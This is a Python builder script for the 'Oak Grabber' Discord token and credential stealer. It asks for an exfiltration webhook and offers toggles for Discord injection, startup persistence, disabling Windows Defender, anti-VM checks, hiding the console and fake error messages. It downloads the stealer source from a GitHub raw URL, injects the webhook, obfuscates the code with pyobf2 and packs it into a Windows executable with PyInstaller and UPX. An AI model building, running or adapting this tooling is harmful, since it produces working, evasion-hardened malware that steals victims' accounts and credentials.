import ast
import os
import re
import shutil
import subprocess
import traceback
import zipfile

import colorama
import pyobf2.lib as obf
import requests

from colorama      import Fore
from InquirerPy    import prompt
from rich.progress import (BarColumn, Progress, TextColumn, TimeElapsedColumn)

# not my code -> https://github.com/addi00000/empyrean really hot

banner = """
                        ░█████╗░░█████╗░██╗░░██╗  ██████╗░██╗░░░██╗██╗██╗░░░░░██████╗░███████╗██████╗░
                        ██╔══██╗██╔══██╗██║░██╔╝  ██╔══██╗██║░░░██║██║██║░░░░░██╔══██╗██╔════╝██╔══██╗
                        ██║░░██║███████║█████═╝░  ██████╦╝██║░░░██║██║██║░░░░░██║░░██║█████╗░░██████╔╝
                        ██║░░██║██╔══██║██╔═██╗░  ██╔══██╗██║░░░██║██║██║░░░░░██║░░██║██╔══╝░░██╔══██╗
                        ╚█████╔╝██║░░██║██║░╚██╗  ██████╦╝╚██████╔╝██║███████╗██████╔╝███████╗██║░░██║
                        ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝  ╚═════╝░░╚═════╝░╚═╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝"""

print(Fore.LIGHTMAGENTA_EX+banner)
print(f'{Fore.LIGHTMAGENTA_EX}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
print()
class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and return the configuration data
    """

    def __init__(self) -> None:
        self.questions = [
            {
                "type": "input",
                "name": "webhook",
                "message": "Enter your webhook URL",
                "validate": (lambda x: False if re.match(r"https://(canary.|ptb.)?(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
            },
            {
                "type": "confirm",
                "name": "Ping_on_run",
                "message": "Ping @everyone?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Self_hide",
                "message": "Self Hide?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Hide_Console",
                "message": "Hide Console?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "inject",
                "message": "Enable Discord injection?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Add_to_startup",
                "message": "Enable startup?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Disable_defender",
                "message": "Disable windows defender?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Black_Screen",
                "message": "Black Screen?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Antivm",
                "message": "Protect against debuggers?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "Fake_error_message",
                "message": "Fake Error Message?",
                "default": True,
            },
        ]

    def get_config(self) -> dict:
        """
        Prompt the user with the questions and return the config data
        """
        return prompt(self.questions)

class MakeEnv:
    """
    The MakeEnv class creates the build directory and clones the source code
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')


    def make_env(self) -> None:
        """
        Creates the build directory
        """
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir)
        os.mkdir(self.build_dir)

class WriteConfig:
    """
    The WriteConfig class writes the config data to the config file
    """

    def __init__(self, config: dict) -> None:
        self.config = config
        self.build_dir = os.path.join(os.getcwd(), 'build')

    def write_config(self) -> None:
        """
        Writes the config data to the config file
        """
        source = requests.get("https://raw.githubusercontent.com/dynastyoak/Oak-Grabber-V2/main/oakv2.py")

        with open(self.build_dir+"\\main.py", "w", encoding="utf-8") as f:
            content = str(source.content.decode('utf-8')).replace(
                "'webhook': 'webhook_here',",
                f"'webhook': '{self.config['webhook']}',"
            ).replace(
                "'Ping_on_run': True,",
                f"'Ping_on_run': {self.config['Ping_on_run']},"
            ).replace(
                "'Add_to_startup': True,",
                f"'Add_to_startup': {self.config['Add_to_startup']},"
            ).replace(
                "'Self_hide': True,",
                f"'Self_hide': {self.config['Self_hide']},"
            ).replace(
                "'Hide_Console': True,",
                f"'Hide_Console': {self.config['Hide_Console']},"
            ).replace(
                "'Disable_defender': True,",
                f"'Disable_defender': {self.config['Disable_defender']},"
            ).replace(
                "'inject': True,",
                f"'inject': {self.config['inject']},"
            ).replace(
                "'Black_Screen': True,",
                f"'Black_Screen': {self.config['Black_Screen']},"
            ).replace(
                "'Fake_error_message': True,",
                f"'Fake_error_message': {self.config['Fake_error_message']},"
            ).replace(
                "'Antivm': True,",
                f"'Antivm': {self.config['Antivm']},"
            )
            content = content.replace('\n', '')  # remove newline characters
            f.write(content)



class DoObfuscate:
    """
    Obfuscate code using https://github.com/0x3C50/pyobf2
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.src_dir = os.path.join(self.build_dir, 'src')
        self.config = {
            "removeTypeHints.enabled": True,
            "fstrToFormatSeq.enabled": True,
            "intObfuscator.enabled": True,
            "intObfuscator.mode": "bits",
            "encodeStrings.enabled": True,
            "renamer.enabled": False,
            "renamer.rename_format": "f'{kind}{get_counter(kind)}'",
            "replaceAttribSet.enabled": True,
            "unicodeTransformer.enabled": True,
        }

    def run(self) -> None:
        """
        Run the obfuscation
        """
        obf.set_config_dict(self.config)
        main = self.build_dir+"\\main.py"
        with open(main, 'r', encoding='utf-8') as f:
                    code = f.read()
        file = ast.parse(code)
        file = obf.do_obfuscation_single_ast(file,file)
        with open(main, 'w', encoding='utf-8') as f:
            f.write(ast.unparse(file))
class Build:
    """
    The Build class downloads and installs the necessary packages and
    then builds the source code
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.current_path = os.getcwd()

    def get_pyinstaller(self) -> None:
        """
        Downloads pyinstaller package
        """
        url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'pyinstaller.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def get_upx(self) -> None:
        """
        Downloads UPX package
        """
        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'upx.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def build(self) -> None:
        """
        Builds the source code using pyinstaller and UPX
        """
        cmd = (['pyinstaller', '--onefile', '--clean', '--distpath', self.current_path, '--workpath', os.path.join(
            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), "-n", "main", "-i", "NONE", self.build_dir+'\\main.py'])
        with subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        ) as process:
            with Progress(
                TextColumn("[bold green]{task.description}", justify="right"),
                BarColumn(bar_width=None),
                "[progress.percentage]{task.percentage:>3.0f}%",
                TimeElapsedColumn(),
            ) as progress:
                build = progress.add_task("          Building...", total=200)
                for line in process.stdout:
                    progress.update(build, advance=1)


def main() -> None:
    colorama.init()

    progress = Progress(
        TextColumn("[bold green]{task.description}", justify="right"),
        BarColumn(bar_width=None),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
    )
    config = Config()
    config_data = config.get_config()

    with progress:
        task1 = progress.add_task("Making environment...", total=1)
        make_env = MakeEnv()
        make_env.make_env()
        progress.update(task1, advance=1)

        task2 = progress.add_task("Writing config...", total=1)
        write_config = WriteConfig(config_data)
        write_config.write_config()
        progress.update(task2, advance=1)

        task3 = progress.add_task("Obfuscating...", total=1)
        do_obfuscate = DoObfuscate()
        do_obfuscate.run()
        progress.update(task3, advance=1)

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()
    print("Done.")
if __name__ == '__main__':
    main()

